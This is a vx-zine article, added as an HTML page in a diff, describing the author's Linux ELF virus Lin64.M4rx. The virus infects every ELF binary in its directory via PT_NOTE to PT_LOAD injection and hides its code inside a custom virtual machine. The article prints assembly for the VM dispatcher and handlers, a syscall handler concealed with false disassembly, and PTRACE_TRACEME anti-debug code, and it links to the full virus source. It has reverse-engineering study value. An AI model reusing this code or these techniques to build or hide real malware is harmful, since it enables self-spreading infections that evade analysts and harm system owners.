@@ -1,0 +1,296 @@
+<html>
+<head>
+<title>Lin64.M4rx: How to write a virtual machine in order to hide your viruses and break your brain forever</title>
+<meta charset="utf-8">
+<link href="./style.css" rel="stylesheet" type="text/css">
+</head>
+<body>
+<div class="txtdiv"><pre>
+                ___________                              __
+                \__    ___/____ ______      ____  __ ___/  |_
+                  |    | /     \\____ \    /  _ \|  |  \   __\
+                  |    ||  Y Y  \  |_&gt; &gt;  (  &lt;_&gt; )  |  /|  |
+                  |____||__|_|  /   __/ /\ \____/|____/ |__|
+                              \/|__|    \/
+
++------------------------------------------------------------------------------+
+|:::::::|  Lin64.M4rx: How to write a virtual machine in order to      |:::::::|
+|:::::::|       hide your viruses and break your brain forever         |:::::::|
++------------------------------------------------------------------------------+
+
+With love, by S01den.
+mail: S01den@protonmail.com
+
+.---\ Introduction /---.
+
+In this new paper, I'm gonna present you my last virus: Lin64.M4rx, the first
+virus I wrote using a VM as a protection against reverse engineering.
+Obviously I didn't and I won't spread it into the wild. Don't do that stupid
+thing neither.
+
+I implemented some tricks to spice a bit the RE, such as false disassembly in
+some parts of the code, and the classic PTRACE_TRACEME technique (but this time,
+it won't be as easy as usual to bypass...).
+
+Also, as a rule, Lin64.M4rx is a virus infecting every ELF which is in the same
+directory (PIE or not), with PT_NOTE to PT_LOAD injection, check sblip's paper
+in tmp0ut #1 for more details [0].
+
+And as usual the payload is stupid as fuck (it just displays "BACA" awesome,
+I don't even know why I choose those letters).
+
+So now you're hyped, we'll start to dig into the m4rx's source code.
+Follow the white rabbit...
+
+.---\ How to write a Virtual Machine in assembly /---.
+
+At first, I think I should explain what a VM is, to not create confusion.
+When talking about binary obfuscation and reverse engineering, a VM is a kind
+of binary protection, where the executed code is written with a custom (or not)
+instruction set and executed with an emulated CPU.
+
+When looking at a disassembled virtualized code, you can see at first what the
+VM is able to do, but not the order in which virtual opcodes are actually
+executed.
+
+Let's see how I created my own VM with its instruction set.
+Before writting any line of code, I drew a schema of how my Virtual Machine would
+work:
+
+           +---------- SPIDER ----------+
+           | main code                  |            +-- H --+ &lt;== HandlersTable
+           |                            |            |___H1__|
+           | f: I -&gt; H                  |--- EXEC ---|___H2__|
+      -----|    Ii -&gt; Hi                |            |__...__|
+      |    | SPIDER = f(VX)             |            |___Hn__|
+      |    +----------------------------+
+      |                                |         +-- VX --+
++----------------------------------+   |--CHECK--|___I1___|
+| I = List of virtual instructions |             |___I2___|
++----------------------------------+             |__...___|
+                                                 |___In___|
+
+                     -------------------------------
+
++--- Virtual Stack ---+      +---VirtualRegistersTable ---+
+|_________S1__________|      |  R1  |  R2  |  ...  |  Rn  |
+|_________..._________|      +----------------------------+
+|_________Sn__________|         ^--- R1 = VPC (virtual program counter)
+
+The virus in itself is written with the custom instruction set I defined.
+For the sake of simplicity, I chose to give the same size (8 bytes) to all
+instructions.
+
+Let's take an example.
+--------------------------------------------------------------------------------
+%define MOV_Rx_Ry(x,y) db 0x04,x,y,0x2e,0xc3,0xec,0x92,0xf
+--------------------------------------------------------------------------------
+This is the set of opcodes corresponding to the instruction MOV_Rx_Ry(x,y),
+which is my virtual equivalent of a "mov rX, rY", such as "mov rax, rbx" in x64.
+
+The first byte, 0x04 here, stands for the number attributed to the instruction,
+it's what the spider will check in order to jump to the right handler.
+
+x and y are arguments, they are replaced by the number corresponding to virtual
+registers when the instruction is called. For example MOV_Rx_Ry(1, 2) will move
+the value stored in the second virtual register into the first virtual register.
+
+Here is a schema showing how I organised the virtual registers.
+(each reg is made of 8 bytes (qword))
+
+[VSP][r0][...][r(NBR_REG-1)][a0][a1][a2][a3][a4][a5][ret] --+
++----------------------------------------------+            |
+| Virtual Context: 8+8*(NBR_REG)+8*6+8 bytes   | &lt;----------+
++----------------------------------------------+
+|          Virtual Stack: 0x600 bytes          |
++----------------------------------------------+
+|         Real Stack: a lot of bytes           |
++----------------------------------------------+
+
+The last five bytes (0x2e,0xc3,0xec,0x92,0xf) are totally useless, they aren't
+used by the handler, that's why I chose random bytes, to confuse reverse
+engineers a little more.
+
+Now, let's admit that we have a MOV_Rx_Ry(A1_PARAM, VSP) somewhere in the virus
+code. This instruction is designed to put the content of the VSP (equivalent of
+RSP for the virtual stack) into A1, a syscall argument register.
+How is the VM able to understand this custom instruction and execute it ?
+
+The answer is spider. It's the name of the piece of code I wrote making links
+between the virtual instructions and their handlers (the blocks of real code
+executing what virtual instructions are designed for).
+
+The code is hopefully not as frightening than an actual spider, it looks like a
+big bug with 0x20 legs but it's in fact a paper tiger[1]:
+
+----------------------------------- cut-here -----------------------------------
+; not the spider, but I think it's important to keep those registers in mind:
+xor rax, rax ; rax will hold the program counter (pc)
+xor rbx, rbx ; rbx will be a buffer register
+xor rcx, rcx ; rcx will hold the first argument of an instruction
+xor rdx, rdx ; rdx will hold the second argument of an instruction
+xor rsi, rsi ; rsi will point to the virtual context (list of all virutal regs)
+xor rdi, rdi ; rdi will point to the virus code
+
+; now, the spider:
+spider:
+  mov rbx, qword [rdi+rax] ; rbx contains the current virtual opcode
+
+  cmp bl, 0x1 ; NOP1
+  je handlers_table.NOP
+  cmp bl, 0x2 ; PUSHR
+  je handlers_table.PUSH_Reg
+  cmp bl, 0x3 ; POP_R
+  je handlers_table.POP_Reg
+  cmp bl, 0x4 ; MOV_Reg_to_Reg
+  je handlers_table.MOV_Reg_to_Reg
+  ...
+  cmp bl, 0x20
+  je handlers_table.JMPNEG
+
+  .cmp_end:
+    cmp rax, virus_end-code-5
+    jl spider
+
+--------------------------------------------------------------------------------
+
+Trivial, as you can see.
+Now, the last piece of the puzzle: the handler.
+The role of a handler is basically to operate on virtual registers or virtual
+stack with real instructions, in order to perform what the virtual instruction
+is supposed to do.
+
+Here is the handler corresponding to MOV_Rx_Ry(Rx, Ry)
+
+----------------------------------- cut-here -----------------------------------
+.MOV_Reg_to_Reg:
+  ; first we clean the registers
+  xor rcx, rcx
+  xor rdx, rdx
+
+  mov cl, byte [rdi+rax+1] ; rcx = Rx
+  mov dl, byte [rdi+rax+2] ; rdx = Ry
+
+  push rbx
+  mov rbx, qword [rsi+rdx*8] ; move to into rbx, the value stored in Rx
+  mov qword [rsi+rcx*8], rbx ; move rbx into Ry
+  pop rbx
+
+  add rax, 0x8 ; pc += 8 (easy because each instruction is made of 8 bytes)
+  jmp spider.cmp_end ; return to spider
+--------------------------------------------------------------------------------
+
+To call a syscall, I wrote a special instruction, named SYSCALL(), taking as
+argument the number of the syscall.
+I specially created some virtual registers, the argument registers, to hold the
+syscall's arguments.
+
+----------------------------------- cut-here -----------------------------------
+.SYSCALL:
+  ; clear registers
+  xor rcx, rcx
+  xor rdx, rdx
+  xor rbx, rbx
+
+  mov bl, byte [rdi+rax+1] ; mov the syscall number in rbx
+
+  ; save everything
+  push rax
+  push rdi
+  push rsi
+  push rdx
+  push r10
+  push r8
+  push r9
+
+  mov rdi, qword [rsi+A0] ; a0 = 1st syscall argument
+  mov rdx, qword [rsi+A2] ; a2 = 3rd syscall argument
+  mov r10, qword [rsi+A3] ; a3 = 4th syscall argument
+  mov r8, qword [rsi+A4] ; a4 = 5th syscall argument
+  mov r9, qword [rsi+A5] ; a5 = 6th syscall argument
+  mov rsi, qword [rsi+A1] ; a1 = 2nd syscall argument
+
+  ; a bit of false disassembly to hide the only syscall instruction in the whole
+  ; source code
+  jmp .jmp_over3+2
+  .jmp_over3:
+      db `\x80\x87`
+  mov rax, rbx ; move the syscall number into rax to perform the syscall
+  mov rbx, rsp
+  syscall
+
+  ; restore everything
+  mov rsp, rbx
+  pop r9
+  pop r8
+  pop r10
+  pop rdx
+  pop rsi
+
+  mov qword [rsi+RET_REG], rax ; mov the syscall return value into the return-reg
+  pop rdi
+  pop rax
+
+  ; go to the next instruction
+  add rax, 0x8 ; pc += 8
+  jmp spider.cmp_end
+--------------------------------------------------------------------------------
+
+.--\ The virtualized virus /--.
+
+Now we have a complete instruction set for our virtual CPU, we can actually use
+the VM!
+However, the code is pretty long, but not really complicated.
+In fact, I took Lin64.Kropotkine[2] as a basis and I translated the code to my
+own instruction set; so I won't explain in details the whole source code.
+
+I'm going to explain the lite anti-debug part, which is located at the beginning
+of the virus.
+
+----------------------------------- cut-here -----------------------------------
+MOV_B(A0_PARAM, 0)
+MOV_B(A1_PARAM, 0)
+MOV_B(A2_PARAM, 1)
+MOV_B(A3_PARAM, 0)
+SYSCALL(101) ; ptrace(PTRACE_TRACEME)
+
+MOV_Rx_Ry(2,RET_REG_PARAM) ; put the return value into reg_2
+MOV_B(A0_PARAM, 0)
+JMP_NE(0,1,2,A0_PARAM)    ; if ptrace value is != 0, jump to MOV_B(A0_PARAM,123)
+JMP_REL(0, 2) ; if ptrace == 0, there is no tracing so we can jump above the exit
+MOV_B(A0_PARAM,123)  ; exit(123)
+SYSCALL(0x3c)
+--------------------------------------------------------------------------------
+
+Once you've understood that, you can understand easily almost all the code.
+
+
+.--\ Conclusion /--.
+
+I hope you enjoyed this paper! This project took me a lot of time, but it was
+really fun to write.
+
+Read the source code! It's not really complicated with the explanations I
+provided you in this paper (in addition to the sources of Lin64.Kropotkine[2])
+and I bet you'll learn a lot!
+
+However if you want to build it and test it, do it inside a VM! The virus is
+a bit unstable and could harm your computer. I'm not responsible of that!
+Test it at your own risks and don't spread it into the wild, I'm sure you're not
+a skiddy.
+
+Maybe it's the first ELF virus using code virtualization, if it's not the case,
+don't hesitate to contact me, I'm pretty curious about that.
+
+Greetz to:
+sblip, tmz, netspooky, yir/okb, shalltear, qkumba, smelly and all the people
+who keep the vx scene alive.
+
+See ya
+
+.--\ Links and references /--.
+
+[0] <a href="https://tmpout.sh/1/2.html">https://tmpout.sh/1/2.html</a>
+[1] <a href="https://en.wikipedia.org/wiki/Paper_tiger">https://en.wikipedia.org/wiki/Paper_tiger</a>
+[2] <a href="https://github.com/vxunderground/MalwareSourceCode/blob/main/VXUG/Linux.Kropotkine.asm">https://github.com/vxunderground/MalwareSourceCode/blob/main/VXUG/Linux.Kropotkine.asm</a>
+</pre></body></html>
